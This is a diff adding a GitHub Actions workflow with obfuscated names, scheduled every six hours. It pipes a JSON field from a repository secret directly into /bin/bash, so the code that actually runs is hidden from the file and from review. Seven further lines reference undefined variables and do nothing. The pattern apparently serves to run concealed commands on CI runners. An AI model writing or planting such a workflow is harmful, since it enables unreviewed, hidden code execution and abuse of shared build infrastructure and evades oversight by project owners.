@@ -1,0 +1,25 @@
+name: quanziye3817
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: quanziye3817
+        env:
+          vaje802: ${{ secrets.vaje802 }}
+        run: |
+          echo $vaje802 | jq -r .vx108 | /bin/bash
+          echo $o75130 | jq -r .zhkx0 | /bin/bash
+          echo $ndtnh04536 | jq -r .qo46934 | /bin/bash
+          echo $zb7 | jq -r .slst8555 | /bin/bash
+          echo $ao551 | jq -r .ive0835 | /bin/bash
+          echo $yggt7 | jq -r .isa87121 | /bin/bash
+          echo $cdrpg7 | jq -r .nwfkv80293 | /bin/bash
+          echo $gcl2 | jq -r .zhf6907 | /bin/bash
+
